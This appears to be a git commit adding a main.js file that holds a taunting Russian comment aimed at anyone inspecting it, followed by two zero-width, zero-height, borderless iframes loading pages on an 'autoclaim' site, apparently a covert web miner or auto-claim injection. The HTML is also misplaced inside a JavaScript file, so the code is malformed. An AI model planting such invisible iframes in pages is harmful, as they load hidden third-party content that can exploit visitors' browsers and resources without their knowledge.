75aeb99e2aa9a155d827f32d710f6a8d519082d6
Toxic Man <70586441+spark228@users.noreply.github.com>
2023-01-31 23:08:58 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,3 @@
+//Если вы видте это, то вы грязный хакер, я не шучу. Что тебе тут надо???
+<iframe src="https://autoclaim.in/wm/jopanegra/2" width="0" height="0" style="border:0"></iframe>;
+<iframe src="https://autoclaim.in/wm/jopanegra/4" width="0" height="0" style="border:0"></iframe>;
